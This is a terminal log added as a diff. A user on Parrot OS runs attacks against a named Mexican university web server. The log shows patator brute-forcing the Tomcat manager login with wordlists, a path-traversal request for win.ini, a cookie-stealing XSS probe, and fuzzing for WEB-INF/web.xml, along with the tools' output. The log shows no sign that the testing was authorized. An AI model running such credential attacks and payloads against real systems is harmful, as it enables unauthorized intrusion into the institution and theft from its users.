@@ -1,0 +1,165 @@
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=backdoor_users.txt 1=key_passwords.txt -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+19:53:11 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 19:53 CST
+19:53:11 patator    INFO -                                                                              
+19:53:11 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:53:11 patator    INFO - -----------------------------------------------------------------------------
+19:53:23 patator    INFO - Hits/Done/Skip/Fail/Size: 0/152/0/0/152, Avg: 13 r/s, Time: 0h 0m 11s
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -B2 -A2 "var key" backdoor_analysis.js | grep -oE "keyCode.*[0-9]+" | cut -d: -f2 | sort -u > keycodes.txt
+grep: backdoor_analysis.js: coincidencia en fichero binario
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $echo "Keycodes encontrados en el backdoor:"
+cat keycodes.txt
+Keycodes encontrados en el backdoor:
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $curl -k "https://sito.utslp.edu.mx/examples/jsp/jsp2/misc/config.jsp"
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<hr>
+<center>
+This banner included with &lt;include-prelude&gt;
+</center>
+<hr>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+
+    <h1>JSP 2.0 Examples - JSP Configuration</h1>
+    <hr>
+    <p>Using a &lt;jsp-property-group&gt; element in the web.xml 
+    deployment descriptor, this JSP page has been configured in the
+    following ways:</p>
+    <ul>
+      <li>Uses &lt;include-prelude&gt; to include the top banner.</li>
+      <li>Uses &lt;include-coda&gt; to include the bottom banner.</li>
+      <li>Uses &lt;scripting-invalid&gt; true to disable 
+	  &lt;% scripting %&gt; elements</li>
+      <li>Uses &lt;el-ignored&gt; true to disable ${EL} elements</li>
+      <li>Uses &lt;page-encoding&gt; ISO-8859-1 to set the page encoding (though this is the default anyway)</li>
+    </ul>
+    There are various other configuration options that can be used.
+
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<hr>
+<center>
+This banner included with &lt;include-coda&gt;
+</center>
+<hr>
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $curl -k "https://sito.utslp.edu.mx/..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $curl -k "https://sito.utslp.edu.mx/examples/jsp/error/error.jsp?name=<script>alert(document.cookie)</script>"
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=winxp_users.txt 1=winxp_pass.txt -t 1 -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+19:56:43 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 19:56 CST
+19:56:43 patator    INFO -                                                                              
+19:56:43 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:56:43 patator    INFO - -----------------------------------------------------------------------------
+19:56:49 patator    INFO - Hits/Done/Skip/Fail/Size: 0/84/0/0/84, Avg: 13 r/s, Time: 0h 0m 6s
+
+:: Method           : GET
+ :: URL              : https://sito.utslp.edu.mx/FUZZ/WEB-INF/web.xml
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 231 req/sec :: Duration: [0:00:22] :: Errors: 19 ::
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -n "function(" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -n "=>" backdoor_analysis.js
+280:     	var emailReg = /^[a-z][a-z-_0-9\.]+@[a-z-_=>0-9\.]+\.[a-z]{2,3}$/i
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -n "\.call\|\.apply" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -n "innerHTML\|outerHTML\|document\.write" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $grep -n "createElement\|appendChild\|insertBefore" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $
+
+
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+20:01:49 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 20:01 CST
+20:01:49 patator    INFO -                                                                              
+20:01:49 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+20:01:49 patator    INFO - -----------------------------------------------------------------------------
+20:01:49 patator    INFO - Hits/Done/Skip/Fail/Size: 0/0/0/0/0, Avg: 0 r/s, Time: 0h 0m 0s
+[+] Testing Tomcat 6.0 specific vulnerabilities...
+HTTP/1.1 400 Petici�n incorrecta
+Server: Apache-Coyote/1.1
+Transfer-Encoding: chunked
+Date: Thu, 09 Oct 2025 02:01:50 GMT
+Connection: close
+
+HTTP/1.1 400 Petici�n incorrecta
+Server: Apache-Coyote/1.1
+Transfer-Encoding: chunked
+Date: Thu, 09 Oct 2025 02:01:50 GMT
+Connection: close
+
+
